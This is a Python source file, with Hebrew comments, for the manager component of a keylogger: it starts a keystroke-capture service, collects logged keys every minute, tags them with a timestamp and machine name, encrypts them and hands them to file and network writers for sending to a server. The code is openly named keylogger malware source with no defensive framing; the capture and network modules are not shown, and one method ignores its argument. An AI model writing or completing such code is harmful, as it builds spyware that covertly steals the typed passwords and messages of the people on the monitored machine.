import threading
import logging
from typing import List, Optional
from datetime import datetime
from interfaces.ikeyLogger import Ikeylogger
from interfaces.iwriter import IWriter
from encryption.encryptor import Encryptor
from config import Config

logging.basicConfig(level=logging.INFO)

class KeyloggerManager:
    def __init__(self, keylogger_service: Ikeylogger, encryptor: Encryptor, file_writer: IWriter = None, network_writer: IWriter=None):
        self.keylogger_service = keylogger_service
        self.file_writer = file_writer
        self.network_writer = network_writer
        self.encryptor = encryptor

        self.buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.timer: Optional[threading.Timer] = None
        self.update_interval = Config.UPDATE_INTERVAL
        self.machine_name = Config.MACHINE_NAME
        self.is_running_flag = False

# פונקציה שמאתחלת את התוכנית 
    def start(self) -> None:
        if self.is_running_flag:
            logging.warning("KeyLoggerManager is already running")
            return
        self.is_running_flag = True
        self.keylogger_service.start_logging()
        self._schedule_collection()
        logging.info(f"KeyLoggerManager started with interval {self.update_interval}s")

# פונקציה שמפסיקה את התוכנית
    def stop(self) -> None:
        if not self.is_running_flag:
            logging.warning("KeyLoggerManager is not running")
            return
        self.is_running_flag = False
        if self.timer:
            self.timer.cancel()
        self.keylogger_service.stop_logging()
        self._collect_and_process()
        logging.info("KeyLoggerManager stopped")

# בודקת את הזמן
    def _schedule_collection(self) -> None:
        if self.is_running_flag:
            now = datetime.now()
            seconds_until_next_minute = 60 - now.second
            self.timer = threading.Timer(seconds_until_next_minute, self._collect_and_process)
            self.timer.start()

# פונקציה שאוספת מידע
    def _collect_and_process(self) -> None:
        try:
            keys = self.keylogger_service.get_logged_keys()
            if keys:
                # סנן None values
                with self.buffer_lock:
                    self.buffer.extend(keys)
                self._process_buffer()
            else:
                logging.debug("No new keys, skipping write")
        except Exception as e:
            logging.error(f"Error during collection: {e}")
        finally:
            if self.is_running_flag:
                self._schedule_collection()

# פונקציה שמקבלת את המידע ומצפינה אותו
    def _process_buffer(self) -> None:
        try:
            with self.buffer_lock:
                if not self.buffer:
                    return
                raw_data = "".join(self.buffer)
                self.buffer.clear()

            data_with_timestamp = self._add_timestamp(raw_data)
            print("\n--- original Data ---")
            print(data_with_timestamp)
            encrypted_data = self.encryptor.encrypt(data_with_timestamp)

            # הדפסה של ההצפנה לפני שמירה
            print("\n--- Encrypted Data ---")
            print(encrypted_data)

            self._send_to_writers(encrypted_data)
            print(f"Processed {len(raw_data)} characters")

        except Exception as e:
            print(f"Error processing buffer: {e}")

# פונקציה שמוסיפה זמן
    def _add_timestamp(self, data: str) -> str:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"

# פונקציה ששולחת לצד שרת
    def _send_to_writers(self, data: str) -> None:
        for writer in [self.file_writer, self. network_writer]:
            if writer:
                try:
                    writer.send_data(data, self.machine_name)
                except Exception as e:
                    logging.error(f"Error sending to file_writer: {e}")

# פונקציה שבודקת אורך מידע
    def get_buffer_size(self) -> int:
        with self.buffer_lock:
            return len(self.buffer)

# מעבדת מידע ומרוקנת את באפר
    def force_flush(self) -> None:
        self._process_buffer()

# פונקציה שמעדכנת אם הזמן כל פעם שמשהו מתעדכן
    def update_interval_sec(self, new_interval: int) -> None:
        new_interval = Config.UPDATE_INTERVAL
        if new_interval <= 0:
            raise ValueError("Interval must be positive")
        self.update_interval = new_interval
        logging.info(f"Update interval changed to {new_interval}s")
        if self.is_running_flag and self.timer:
            self.timer.cancel()
            self._schedule_collection()

# פונקציה שבודקת אם התוכנית פועלת
    def is_running(self) -> bool:
        return self.is_running_flag